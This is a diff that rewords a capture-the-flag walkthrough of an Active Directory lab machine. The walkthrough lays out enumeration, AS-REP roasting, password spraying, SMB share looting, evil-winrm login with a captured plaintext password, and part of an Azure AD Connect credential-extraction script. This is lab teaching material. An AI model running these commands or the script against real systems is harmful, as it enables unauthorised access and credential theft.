@@ -18,21 +18,21 @@ aliases:
 # Walkthrough
 
 
-We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.
+Let's start with the basics and run an `nmap` scan to see what the machine is exposing.
 
-First let's find the ports
+First, I'll enumerate the open ports.
 
 ```
 nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
 ```
 
-- `$T` is a variable i created to store the IP of the target machine
+- `$T` is a variable I use to hold the target's IP address.
 
-We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again
+I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.
 
-Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
+You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
 
-Once we have the ports, we will do another `nmap` going more in detail
+With the ports in hand, I'll run a second, more detailed `nmap` scan.
 
 ```
 nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696
@@ -40,7 +40,7 @@ nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 53,88,135,139,389,44
 
 ![](../../0.%20Assets/Monteverde-1791288777615.webp)
 
-Cool, let's add the domain name for correct `kerberos` authentication in out `/etc/hosts` file
+Let's add the domain name to `/etc/hosts` so `kerberos` authentication works correctly.
 
 ```
 netexec smb $T
@@ -50,13 +50,13 @@ netexec smb $T
 
 ![](../../0.%20Assets/Monteverde-1791288996455.webp)
 
-Let's see if we can do some anonymous enumeration
+Let's see if anonymous enumeration gets us anywhere.
 
-Anonymous is allowed but no shares shown and/or no user enumeration
+Anonymous access is allowed, but it shows no shares and no user enumeration.
 
 ![](../../0.%20Assets/Monteverde-1791289237358.webp)
 
-so i moved to other protocols like RCP
+So I moved to other protocols, like RPC.
 
 ```
 rpcclient -U '' -N $T
@@ -74,7 +74,7 @@ user:[smorgan] rid:[0xa37]
 rpcclient $> exit
 ```
 
-And we are allowed to enumerate users, so let's get a list using some `regex`
+We're allowed to enumerate users, so let's build a list with some `regex`.
 
 ```
 rpcclient -U '' -N "$T" -c 'enumdomusers' | grep -oP 'user:\[\K[^]]+' > users.txt
@@ -82,7 +82,7 @@ rpcclient -U '' -N "$T" -c 'enumdomusers' | grep -oP 'user:\[\K[^]]+' > users.tx
 
 ![](../../0.%20Assets/Monteverde-1791289441999.webp)
 
-next logical step is to `as-rep` roast the user.
+The next logical step is to `as-rep` roast the users.
 
 ```
 impacket-GetNPUsers 'MEGABANK.LOCAL/' \                           
@@ -95,27 +95,27 @@ impacket-GetNPUsers 'MEGABANK.LOCAL/' \
 
 ![](../../0.%20Assets/Monteverde-1791289516272.webp)
 
-All of the users requires Preauth so let's try to find credentials
+All of the users require preauth, so let's try to find credentials another way.
 
-First thing I did was testing if any of the users didn't have a password
+The first thing I did was check whether any of the users had a blank password.
 
 ```
 netexec smb $T -u users.txt -p ''
 ```
 
-Without success
+No success.
 
 ![](../../0.%20Assets/Monteverde-1791289686628.webp)
 
-I was running out of ideas and I tested `ldapdomaindump` and  recollecting information with `bloodhound-python` with `anonymous` credentials but didn't work, we still need some set of credentials, we have users, we need a password.
+Running low on ideas, I tried `ldapdomaindump` and collecting data with `bloodhound-python` using `anonymous` credentials, but neither worked. We still need a set of credentials: we have users, we just need a password.
 
-So I decided to do something I hate which is `Brute forcing` 
+So I resorted to something I dislike: `brute forcing`.
 
 ```
 netexec smb $T -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding
 ```
 
-This was taking a very long time so I decided to run the list of users against itself
+This was taking forever, so I tried spraying the list of users against itself as passwords.
 
 ```
 netexec smb $T -u users.txt -p users.txt --continue-on-success --ignore-pw-decoding -t 50
@@ -123,7 +123,7 @@ netexec smb $T -u users.txt -p users.txt --continue-on-success --ignore-pw-decod
 
 ![](../../0.%20Assets/Monteverde-1791291523487.webp)
 
-Great!!! Let's create a file with the credentials and let's see what we can do with them
+That worked. Let's save the credentials to a file and see what we can do with them.
 
 ```
 ./nxcspray all $T -u 'SABatchJobs' -p 'SABatchJobs'
@@ -131,7 +131,7 @@ Great!!! Let's create a file with the credentials and let's see what we can do w
 
 ![](../../0.%20Assets/Monteverde-1791291890724.webp)
 
-cool, let's see if this user has any shares
+Let's see if this user has any shares.
 
 ```
 netexec smb $T -u SABatchJobs -p 'SABatchJobs' --shares
@@ -139,7 +139,7 @@ netexec smb $T -u SABatchJobs -p 'SABatchJobs' --shares
 
 ![](../../0.%20Assets/Monteverde-1791291922071.webp)
 
-Great, let's see what we can find
+Let's see what we can find.
 
 ```
 netexec smb $T -u SABatchJobs -p 'SABatchJobs' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
@@ -149,15 +149,15 @@ netexec smb $T -u SABatchJobs -p 'SABatchJobs' -M spider_plus -o DOWNLOAD_FLAG=t
 
 ![](../../0.%20Assets/Monteverde-1791292974326.webp)
 
-This looks interesting because that is a known user
+This looks interesting, since it's a known user.
 
 ![](../../0.%20Assets/Monteverde-1791292989753.webp)
 
-Great!! we have credentials, add them to the credential file
+We have more credentials, so add them to the credential file.
 
 ![](../../0.%20Assets/Monteverde-1791294153840.webp)
 
-And test them against all the protocols
+And test them against every protocol.
 
 ```
 ./nxcspray all $T -u mhope -p '4n0therD4y@n0th3r$'
@@ -174,25 +174,25 @@ evil-winrm -i $T -u mhope -p '4n0therD4y@n0th3r$'
 
 ![](../../0.%20Assets/Monteverde-1791294365066.webp)
 
-	And we have the first flag
+	And we have the first flag.
 
-Trying to get a reverse shell I encountered this message
+While trying to get a reverse shell, I ran into this message.
 
 ![](../../0.%20Assets/Monteverde-1791294767838.webp)
 
-Tried evading it with some techniques but no luck so we either get the information we need without dropping a binary in disk or find it from outside the domain
+I tried a few evasion techniques without luck, so we'll either get what we need without dropping a binary to disk or find it from outside the domain.
 
-Let's do some `kerberoasting` and see if we need to jump to another user
+Let's do some `kerberoasting` and see if we need to pivot to another user.
 
 ![](../../0.%20Assets/Monteverde-1791296036593.webp)
 
-No luck, let's test `ADCS`  
+No luck there, so let's test `ADCS`.
 
 ```
 nxc ldap $T -d megabank.local -u mhope -p '4n0therD4y@n0th3r$' -M adcs
 ```
 
-Didn't get much here let's check privileges and stuff
+That didn't get us much, so let's check our privileges.
 
 ```
 whoami /all
@@ -200,11 +200,11 @@ whoami /all
 
 ![](../../0.%20Assets/Monteverde-1791298242015.webp)
 
-That is a strange group after some google searching we find out that that group is related to a service called `Azure AD`
+That's an unusual group. After some searching, we find it's tied to a service called `Azure AD`.
 
-After quite some more google-ing I found this [website](https://blog.xpnsec.com/azuread-connect-for-redteam/)
+After a good bit more digging, I found this [website](https://blog.xpnsec.com/azuread-connect-for-redteam/).
 
-Where they give this script
+It provides this script.
 ```
 Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
 
@@ -248,7 +248,7 @@ Write-Host ("Password: " + $password.Password)
 
 This script reads Azure AD Connect’s local database and uses its cryptographic library to decrypt the stored password for the Active Directory connector account. If it has sufficient access to the database and encryption keys, it prints the domain, username, and plaintext password.
 
-after running it
+After running it:
 
 ![](../../0.%20Assets/Monteverde-1791299596839.webp)
 
